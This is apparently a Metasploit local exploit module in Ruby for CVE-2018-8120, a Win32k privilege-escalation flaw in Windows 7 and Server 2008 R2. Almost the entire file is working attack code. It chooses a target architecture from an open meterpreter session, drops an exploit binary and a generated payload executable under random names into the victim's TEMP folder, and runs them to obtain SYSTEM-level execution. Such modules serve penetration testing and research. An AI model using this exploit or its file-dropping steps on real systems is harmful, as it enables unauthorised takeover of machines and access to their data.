##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Exploit::FileDropper


  def initialize(info={})
    super(update_info(info,
    'Name'            => 'Windows SetImeInfoEx Win32k NULL Pointer Dereference',
    'Description'     => %q{
      This module exploits elevation of privilege vulnerability that exists in Windows 7 and 2008 R2
      when the Win32k component fails to properly handle objects in memory. An attacker who
      successfully exploited this vulnerability could run arbitrary code in kernel mode. An
      attacker could then install programs; view, change, or delete data; or create new
      accounts with full user rights.

      This module is tested against windows 7 x86, windows 7 x64 and windows server 2008 R2 standard x64.
    },
    'License'         => MSF_LICENSE,
    'Author'          => [
        'unamer', # Exploit PoC
        'bigric3', # Analysis and exploit
        'Anton Cherepanov', # Vulnerability discovery
        'Dhiraj Mishra <dhiraj@notsosecure.com>' # Metasploit
      ],
    'Platform'        => 'win',
    'SessionTypes'    => [ 'meterpreter' ],
    'DefaultOptions'  => {
        'EXITFUNC'    => 'thread'
      },
    'Targets'         => [
        [ 'Automatic', {} ],
        [ 'Windows 7 x64', { 'Arch' => ARCH_X64 } ],
        [ 'Windows 7 x86', { 'Arch' => ARCH_X86 } ]
      ],
    'Payload'         => {
        'Space'       => 4096,
        'DisableNops' => true
      },
    'References'      => [
        ['BID', '104034'],
        ['CVE', '2018-8120'],
        ['URL', 'https://github.com/unamer/CVE-2018-8120'],
        ['URL', 'https://github.com/bigric3/cve-2018-8120'],
        ['URL', 'http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html'],
        ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120']
      ],
    'DisclosureDate'  => 'May 9 2018',
    'DefaultTarget'   => 0
    ))
  end

  def assign_target
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo['OS'] =~ /XP|NT/i
      fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP')
    end

    return target unless target.name == 'Automatic'

    case sysinfo['Architecture']
    when 'x64'
      vprint_status('Targeting x64 system')
      return targets[1]
    when 'x86'
      fail_with(Failure::BadConfig, "Invalid payload architecture") if payload_instance.arch.first == ARCH_X64
      vprint_status('Targeting x86 system')
      return targets[2]
    end
  end

  def write_file_to_target(fname, data)
    tempdir = session.sys.config.getenv('TEMP')
    file_loc = "#{tempdir}\\#{fname}"
    vprint_warning("Attempting to write #{fname} to #{tempdir}")
    write_file(file_loc, data)
    vprint_good("#{fname} written")
    file_loc
  rescue Rex::Post::Meterpreter::RequestError => e
    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    fail_with(Failure::Unknown, "Writing #{fname} to disk was unsuccessful")
  end

  def check_arch
    sys_arch = assign_target
    if sys_arch.name =~ /x86/
      return 'CVE-2018-8120x86.exe'
    else sys_arch.name =~ /x64/
      return 'CVE-2018-8120x64.exe'
    end
  end

  def exploit
    cve_fname = check_arch
    rexe = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8120', cve_fname)
    vprint_status("Reading payload from file #{rexe}")
    raw = File.read(rexe)

    rexename = "#{Rex::Text.rand_text_alphanumeric(10)}.exe"
    vprint_status("EXE's name is: #{rexename}")
    exe = generate_payload_exe
    tempexename = "#{Rex::Text.rand_text_alpha(6..14)}.exe"

    exe_payload = write_file_to_target(tempexename, exe)
    vprint_status("Payload uploaded to temp folder")
    cve_exe = write_file_to_target(rexename, raw)
    command = "\"#{cve_exe}\" \"#{exe_payload}\""
    vprint_status("Location of CVE-2018-8120.exe is: #{cve_exe}")
    register_file_for_cleanup(exe_payload)

    vprint_status("Executing command : #{command}")
    cmd_exec_get_pid(command)
    print_good('Exploit finished, wait for privileged payload execution to complete.')
  end
end
